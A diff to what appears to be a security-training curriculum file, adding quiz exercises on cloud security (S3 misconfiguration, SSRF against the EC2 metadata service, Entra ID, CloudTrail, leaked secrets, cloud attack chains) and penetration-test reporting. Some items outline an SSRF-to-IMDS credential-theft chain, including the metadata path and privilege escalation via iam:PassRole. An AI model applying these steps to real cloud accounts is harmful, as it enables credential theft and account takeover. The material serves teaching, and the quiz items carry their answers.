+            "blanks": [
+              "--no-sign-request"
+            ],
+            "explanation": "--no-sign-request tells the CLI to skip signing, so the call reaches a public bucket without any AWS account.",
+            "distractors": [
+              "--no-verify-ssl",
+              "--anonymous"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each S3 access setting to what it enables or prevents.",
+            "pairs": [
+              {
+                "left": "Public-list",
+                "right": "Enumerate every object in the bucket"
+              },
+              {
+                "left": "Public-read",
+                "right": "Download any object in the bucket"
+              },
+              {
+                "left": "Public-write",
+                "right": "Upload or overwrite arbitrary content"
+              },
+              {
+                "left": "S3 Block Public Access",
+                "right": "Overrides any public-granting policy or ACL beneath it"
+              }
+            ],
+            "explanation": "List, read, and write grant progressively more access, while Block Public Access is the account/bucket baseline that neutralizes public-granting policies."
+          }
+        ],
         moduleId: "m20",
         number: 178,
         title: "S3 Bucket Misconfiguration",
@@ -34202,6 +41756,34 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m20-4",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps of an SSRF-to-IMDS credential-theft chain.",
+            "items": [
+              "Find an SSRF flaw in an app running on the EC2 instance",
+              "Point the server-side request at 169.254.169.254",
+              "Request the attached role at /latest/meta-data/iam/security-credentials/<role-name>",
+              "Receive the role's temporary access key, secret key, and session token",
+              "Use the stolen credentials directly against the AWS API"
+            ],
+            "explanation": "SSRF lets the attacker reach the non-routable metadata address, pull the instance role's temporary credentials, and wield the role's permissions against AWS."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the metadata address and the IMDSv2 requirement.",
+            "template": "IMDS lives at the link-local address ___ , and IMDSv2 requires a ___ request to /latest/api/token before any metadata GET is honored.",
+            "blanks": [
+              "169.254.169.254",
+              "PUT"
+            ],
+            "explanation": "A GET-only SSRF cannot perform the mandatory PUT token request of IMDSv2, which is why enforcing IMDSv2-only mitigates the attack.",
+            "distractors": [
+              "GET",
+              "127.0.0.1"
+            ]
+          }
+        ],
         moduleId: "m20",
         number: 179,
         title: "Cloud Metadata Service SSRF (EC2 IMDS)",
@@ -34384,6 +41966,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m20-5",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each Entra ID concept to its description.",
+            "pairs": [
+              {
+                "left": "Tenant",
+                "right": "Isolated directory instance belonging to one organization"
+              },
+              {
+                "left": "Conditional Access policy",
+                "right": "If-this-then-that rule evaluated at sign-in"
+              },
+              {
+                "left": "Azure AD Connect",
+                "right": "Syncs on-prem AD users into Entra ID"
+              },
+              {
+                "left": "Entra ID protocols",
+                "right": "OAuth 2.0, OpenID Connect, and SAML"
+              }
+            ],
+            "explanation": "Entra ID is a cloud-native identity provider: identities live in a tenant, Conditional Access enforces sign-in rules, and hybrid sync bridges on-prem AD."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the statement about what Entra ID lacks compared with on-prem AD.",
+            "template": "Entra ID has no ___ , no Group Policy Objects, and no Kerberos tickets like on-prem AD.",
+            "blanks": [
+              "Organizational Units"
+            ],
+            "explanation": "The on-prem AD mental model (OUs, GPOs, Kerberos) does not transfer; Entra ID uses tenants, Conditional Access, and HTTPS-based identity protocols instead.",
+            "distractors": [
+              "Conditional Access policies",
+              "tenants"
+            ]
+          }
+        ],
         moduleId: "m20",
         number: 180,
         title: "Azure AD / Entra ID Basics",
@@ -34570,6 +42190,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m20-6",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each logging/monitoring element to its role.",
+            "pairs": [
+              {
+                "left": "CloudTrail",
+                "right": "Logs every AWS API call as a control-plane audit trail"
+              },
+              {
+                "left": "GuardDuty",
+                "right": "Managed threat detection using anomaly detection and threat intel"
+              },
+              {
+                "left": "cloudtrail:StopLogging",
+                "right": "Permission an intruder abuses to halt the audit trail"
+              },
+              {
+                "left": "MFA delete on the log bucket",
+                "right": "Limits an attacker tampering with stored logs"
+              }
+            ],
+            "explanation": "CloudTrail records API activity, GuardDuty analyzes it for threats, and protecting the trail (restricting StopLogging, MFA delete) preserves incident-response evidence."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the third data source GuardDuty layers on top of CloudTrail.",
+            "template": "GuardDuty analyzes CloudTrail, VPC Flow Logs, and ___ logs to flag threats.",
+            "blanks": [
+              "DNS"
+            ],
+            "explanation": "DNS logs let GuardDuty catch signals like an instance querying known cryptomining domains, which API and flow logs alone would miss.",
+            "distractors": [
+              "access",
+              "debug"
+            ]
+          }
+        ],
         moduleId: "m20",
         number: 181,
         title: "Cloud Logging & Monitoring - CloudTrail & GuardDuty",
@@ -34755,6 +42413,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m20-7",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each secrets-exposure fact to its detail.",
+            "pairs": [
+              {
+                "left": "AKIA prefix",
+                "right": "Long-term AWS access key"
+              },
+              {
+                "left": "ASIA prefix",
+                "right": "Temporary/session credentials"
+              },
+              {
+                "left": "Committed .env in a public repo",
+                "right": "Found and abused within minutes of the push"
+              },
+              {
+                "left": "Secret in an early Docker layer",
+                "right": "Persists even if a later layer deletes it"
+              }
+            ],
+            "explanation": "Key prefixes distinguish long-term from session credentials, and both GitHub commits and immutable Docker layers leak secrets that deletion in a later step does not remove."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the correct remediation for a leaked AWS key.",
+            "template": "Remediation for an exposed key is ___ or revocation, not just removing it from the latest commit.",
+            "blanks": [
+              "rotation"
+            ],
+            "explanation": "Git history and old image layers still hold the key, so it must be rotated or revoked rather than merely deleted from the newest commit.",
+            "distractors": [
+              "encryption",
+              "obfuscation"
+            ]
+          }
+        ],
         moduleId: "m20",
         number: 182,
         title: "Common Cloud Secrets-Exposure Vectors",
@@ -34899,6 +42595,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m20-8",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the stages of a realistic cloud attack chain.",
+            "items": [
+              "Gain an initial credential (public bucket, leaked key, or SSRF to IMDS)",
+              "Run aws sts get-caller-identity to confirm the identity obtained",
+              "Enumerate that identity's actual attached permissions",
+              "Escalate via an over-broad existing policy (e.g. iam:PassRole)",
+              "Move laterally across other services in the account"
+            ],
+            "explanation": "Cloud compromises chain minor findings: get a foothold, confirm the identity, enumerate its rights, escalate through someone else's loose policy, then pivot account-wide."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each attack-chain step to the command or primitive used.",
+            "pairs": [
+              {
+                "left": "Confirm the obtained identity",
+                "right": "aws sts get-caller-identity"
+              },
+              {
+                "left": "Enumerate attached managed policies",
+                "right": "aws iam list-attached-user-policies"
+              },
+              {
+                "left": "Privilege-escalation primitive",
+                "right": "Over-broad iam:PassRole already attached by someone else"
+              },
+              {
+                "left": "Lateral movement",
+                "right": "Using creds against other S3, EC2, or Secrets Manager"
+              }
+            ],
+            "explanation": "Each step looks low severity alone, but confirming, enumerating, escalating, and pivoting combine into full account takeover, so related findings should be triaged together."
+          }
+        ],
         moduleId: "m20",
         number: 183,
         title: "Synthesis: A Realistic Cloud Attack Chain",
@@ -35150,6 +42883,44 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m21-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each engagement element to what it actually is from the client's perspective.",
+            "pairs": [
+              {
+                "left": "The report",
+                "right": "The deliverable the client purchased and acts on"
+              },
+              {
+                "left": "The exploit, shell, and loot",
+                "right": "Research artifacts, not the product"
+              },
+              {
+                "left": "An unreported vulnerability",
+                "right": "Functionally identical to one never found"
+              },
+              {
+                "left": "How clients and auditors judge quality",
+                "right": "Report clarity and completeness"
+              }
+            ],
+            "explanation": "Value is realised only through the report; the technical work is the research that produces it, and quality is judged on the write-up, not the attack chain."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the statement about why reporting is the real deliverable.",
+            "template": "From the client's side, an unreported vulnerability and one that was ___ look identical.",
+            "blanks": [
+              "never discovered"
+            ],
+            "explanation": "A finding that never reaches a clear write-up delivers zero value, so to the client it is indistinguishable from a bug that was never found.",
+            "distractors": [
+              "already patched",
+              "scored Critical"
+            ]
+          }
+        ],
         moduleId: "m21",
         number: 300,
         title: "Why Reporting Is the Actual Deliverable",
@@ -35287,6 +43058,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m21-2",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the CVSS v3.1 base score severity bands from lowest to highest.",
+            "items": [
+              "None (0.0)",
+              "Low (0.1-3.9)",
+              "Medium (4.0-6.9)",
+              "High (7.0-8.9)",
+              "Critical (9.0-10.0)"
+            ],
+            "explanation": "The CVSS v3.1 base score maps onto these qualitative severity bands in ascending order of risk."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each CVSS v3.1 metric or value to what it describes.",
+            "pairs": [
+              {
+                "left": "Attack Vector: Network",
+                "right": "Remotely exploitable"
+              },
+              {
+                "left": "Attack Vector: Physical",
+                "right": "Attacker must touch the device"
+              },
+              {
+                "left": "Scope: Changed",
+                "right": "Impact reaches beyond the vulnerable component's authority"
+              },
+              {
+                "left": "Confidentiality, Integrity, Availability",
+                "right": "The impact triad"
+              }
+            ],
+            "explanation": "Exploitability metrics like Attack Vector and Scope describe how a bug is reached and whether impact spreads, while the C/I/A triad describes what happens once it is exploited."
+          }
+        ],
         moduleId: "m21",
         number: 301,
         title: "CVSS v3.1 Scoring Methodology",
@@ -35425,6 +43233,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m21-3",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Rewrite the technique as business impact for the executive summary.",
+            "template": "Not 'authentication bypass via JWT algorithm confusion' but 'an external attacker can ___ any customer, including administrators'.",
+            "blanks": [
+              "log in as"
+            ],
+            "explanation": "The executive summary must translate technique into business consequence because its reader has zero familiarity with attack tooling.",
+            "distractors": [
+              "fingerprint",
+              "rate-limit"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each part of the executive summary to its content.",
+            "pairs": [
+              {
+                "left": "Intended reader",
+                "right": "Executive who never opens the technical section"
+              },
+              {
+                "left": "Opening",
+                "right": "Overall risk posture and top findings' business impact"
+              },
+              {
+                "left": "Scope statement",
+                "right": "What was and wasn't tested"
+              },
+              {
+                "left": "Closing",
+                "right": "What leadership must decide or fund next"
+              }
+            ],
+            "explanation": "The summary leads with risk posture in business terms, states scope honestly, and closes with a decision for leadership rather than a chronological account."
+          }
+        ],
         moduleId: "m21",
         number: 302,
         title: "Structuring the Executive Summary",
@@ -35552,6 +43398,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m21-4",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order these elements of a technical finding as they appear in the standard anatomy.",
+            "items": [
+              "Severity / CVSS score",
+              "Affected asset",
+              "Description",
+              "Reproduction steps",
+              "Remediation"
+            ],
+            "explanation": "Mature reporting standards converge on this anatomy so a reader can triage by severity, locate the asset, understand the mechanism, reproduce it, and fix it."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each finding section to the reader question it answers.",
+            "pairs": [
+              {
+                "left": "Title and CVSS score",
+                "right": "What should I triage first?"
+              },
+              {
+                "left": "Affected asset",
+                "right": "Which host or endpoint do I fix?"
+              },
+              {
+                "left": "Reproduction steps",
+                "right": "How do I trigger the same result?"
+              },
+              {
+                "left": "Remediation",
+                "right": "What specific fix do I apply?"
+              }
+            ],
+            "explanation": "Each section exists to answer a concrete question, which is why precise assets and exact numbered reproduction steps matter more than narration."
+          }
+        ],
         moduleId: "m21",
         number: 303,
         title: "Structuring a Technical Finding",
@@ -35707,6 +43590,40 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m21-5",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each severity band to its appropriate remediation timeframe.",
+            "pairs": [
+              {
+                "left": "Critical",
+                "right": "Immediate / days"
+              },
+              {
+                "left": "High",
+                "right": "Weeks"
+              },
+              {
+                "left": "Medium and Low",
+                "right": "Next scheduled release or patch cycle"
+              }
+            ],
+            "explanation": "Tying timeframes to severity, not to how interesting the bug was, gives the client's team a defensible order to triage against their existing workload."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the rule about remediation timelines.",
+            "template": "A remediation timeline with no ___ is a suggestion, not a requirement.",
+            "blanks": [
+              "deadline"
+            ],
+            "explanation": "Clients deprioritise undated findings against dated work, so every recommendation needs a timeframe tied to its severity.",
+            "distractors": [
+              "severity",
+              "owner"
+            ]
+          }
+        ],
         moduleId: "m21",
         number: 304,
         title: "Remediation Prioritisation and Timelines",
@@ -35857,6 +43774,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m21-6",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each common reporting mistake to the credibility it costs.",
+            "pairs": [
+              {
+                "left": "Over-technical executive summary",
+                "right": "Loses the business reader it was meant for"
+              },
+              {
+                "left": "Missing reproduction steps",
+                "right": "Finding becomes unverifiable"
+              },
+              {
+                "left": "Inflated severity ratings",
+                "right": "Loses trust when a score is disputed"
+              },
+              {
+                "left": "Typos and unproofed CVSS scores",
+                "right": "Reads as unreviewed work"
+              }
+            ],
+            "explanation": "Each recurring mistake costs credibility with a different audience, from the CISO reading the summary to the engineer trying to reproduce a finding."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the statement about unverifiable findings.",
+            "template": "To a skeptical reader, an unverifiable finding is indistinguishable from an ___ one.",
+            "blanks": [
+              "incorrect"
+            ],
+            "explanation": "Without exact reproduction steps a client's team cannot confirm the bug, so they assume it was never real.",
+            "distractors": [
+              "exploited",
+              "duplicate"
+            ]
+          }
+        ],
         moduleId: "m21",
         number: 305,
         title: "Common Reporting Mistakes",
@@ -35993,6 +43948,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m21-7",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the last-mile steps for turning your L38 capstone findings into a client-ready report.",
+            "items": [
+              "CVSS-score at least three capstone findings",
+              "Write one executive-summary paragraph for the engagement",
+              "Build one complete technical finding for the highest-severity result",
+              "Check the write-up against the common-mistakes checklist"
+            ],
+            "explanation": "The capstone closes the loop: score findings, frame the engagement for an executive, fully document the top result, then validate against the mistakes checklist before calling it done."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the instruction for scoring your capstone findings.",
+            "template": "Score each capstone finding with the full ___ base metric group, not a gut-feel severity label.",
+            "blanks": [
+              "CVSS v3.1"
+            ],
+            "explanation": "Using the full base metric walkthrough makes each score reproducible and defensible if the client challenges it.",
+            "distractors": [
+              "CVSS v2",
+              "OWASP risk"
+            ]
+          }
+        ],
         moduleId: "m21",
         number: 306,
         title: "Capstone Synthesis: From L38 Findings to a Client-Ready Report",
